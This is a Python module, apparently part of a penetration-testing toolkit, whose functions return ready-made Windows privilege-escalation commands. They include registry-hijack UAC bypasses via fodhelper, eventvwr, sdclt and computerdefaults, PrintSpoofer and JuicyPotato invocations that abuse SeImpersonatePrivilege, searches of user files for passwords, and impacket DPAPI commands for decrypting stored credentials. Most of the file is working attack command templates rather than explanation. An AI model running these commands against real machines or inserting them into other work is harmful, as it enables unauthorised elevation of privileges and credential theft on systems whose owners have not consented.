"""Windows privilege escalation enumeration and exploit helpers."""

from __future__ import annotations

__all__ = [
    "uac_bypass_commands",
    "token_privileges_commands",
    "unquoted_service_path_command",
    "alwaysinstallelevated_commands",
    "weak_service_permissions_command",
    "credential_files_commands",
    "dpapi_commands",
    "printspoofer_command",
    "juicy_potato_command",
    "registry_autorun_commands",
]

_UAC_BYPASS_MAP: dict[str, list[str]] = {
    "fodhelper": [
        'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "{payload}" /f',
        'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v "DelegateExecute" /f',
        "fodhelper.exe",
    ],
    "eventvwr": [
        'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d "{payload}" /f',
        "eventvwr.exe",
    ],
    "sdclt": [
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" /d "{payload}" /f',
        "sdclt.exe",
    ],
    "computerdefaults": [
        'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "{payload}" /f',
        'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v "DelegateExecute" /f',
        "computerdefaults.exe",
    ],
}


def uac_bypass_commands(
    technique: str = "fodhelper",
    *,
    payload: str = "cmd.exe",
) -> list[str]:
    """Return UAC bypass commands for the specified technique.

    Args:
        technique: ``fodhelper`` | ``eventvwr`` | ``sdclt`` | ``computerdefaults``.
        payload: Command to execute with elevated privileges.
    """
    template = _UAC_BYPASS_MAP.get(technique, _UAC_BYPASS_MAP["fodhelper"])
    return [cmd.format(payload=payload) for cmd in template]


def token_privileges_commands() -> list[str]:
    """Return commands to enumerate current token privileges for potential abuse.

    High-value privileges: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege,
    SeDebugPrivilege, SeTakeOwnershipPrivilege.
    """
    return [
        "whoami /priv",
        "whoami /groups",
        "whoami /all",
    ]


def unquoted_service_path_command() -> str:
    """Return a WMI query to find unquoted service path vulnerabilities."""
    return (
        "wmic service get name,displayname,pathname,startmode "
        '| findstr /i "auto" '
        '| findstr /i /v "c:\\windows" '
        "| findstr /i /v '\"'"
    )


def alwaysinstallelevated_commands() -> list[str]:
    """Return registry queries to check for AlwaysInstallElevated misconfiguration."""
    return [
        "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
    ]


def weak_service_permissions_command() -> str:
    """Return a PowerShell command to check service binary write permissions."""
    return (
        "Get-WmiObject Win32_Service | Select-Object Name,PathName | "
        "ForEach-Object { $p=$_.PathName -replace '\"',''; "
        "if (Test-Path $p) { "
        "  $acl = Get-Acl $p -ErrorAction SilentlyContinue; "
        "  $acl.Access | Where-Object {$_.FileSystemRights -match 'Write|FullControl' "
        "    -and $_.IdentityReference -notmatch 'NT AUTHORITY|BUILTIN\\\\Administrators'} | "
        "  ForEach-Object { [PSCustomObject]@{Service=$_.Name; Path=$p; Identity=$_.IdentityReference} } "
        "} }"
    )


def credential_files_commands() -> list[str]:
    """Return commands to locate common Windows credential storage locations."""
    return [
        "cmdkey /list",
        r"dir %userprofile%\AppData\Local\Microsoft\Credentials\ /a",
        r"dir %userprofile%\AppData\Roaming\Microsoft\Credentials\ /a",
        r"dir /s /b %userprofile%\*.xml %userprofile%\*.ini %userprofile%\*.txt 2>nul | findstr /i pass",
        r"Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.xml,*.ini,*.txt "
        r"-ErrorAction SilentlyContinue | Select-String -Pattern 'password'",
    ]


def dpapi_commands(
    masterkey_file: str,
    *,
    password: str = "",
    sid: str = "",
    credential_file: str = "",
) -> list[str]:
    """Return impacket dpapi commands for offline DPAPI blob decryption.

    Provide either (password + sid) for masterkey decryption, or
    (credential_file + a previously decrypted masterkey_hex).
    """
    cmds: list[str] = []
    if password and sid:
        cmds.append(
            f"dpapi.py masterkey -file '{masterkey_file}' -sid {sid} -password '{password}'"
        )
    if credential_file:
        cmds.append(
            f"dpapi.py credential -file '{credential_file}' -key <masterkey_hex>"
        )
    return cmds


def printspoofer_command(payload: str = "cmd.exe") -> str:
    """Return a PrintSpoofer command to abuse SeImpersonatePrivilege."""
    return f'PrintSpoofer.exe -i -c "{payload}"'


def juicy_potato_command(
    payload: str = "cmd.exe",
    *,
    clsid: str = "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}",
    port: int = 10000,
) -> str:
    """Return a JuicyPotato command to abuse SeImpersonatePrivilege.

    The default CLSID targets Windows Server 2016/Windows 10. Use the
    CLSID list at https://github.com/ohpe/juicy-potato/tree/master/CLSID
    for other OS versions.
    """
    return f'JuicyPotato.exe -l {port} -p "{payload}" -t * -c "{clsid}"'


def registry_autorun_commands() -> list[str]:
    """Return commands to enumerate common Windows registry autoruns."""
    keys = [
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    ]
    return [f'reg query "{k}"' for k in keys]
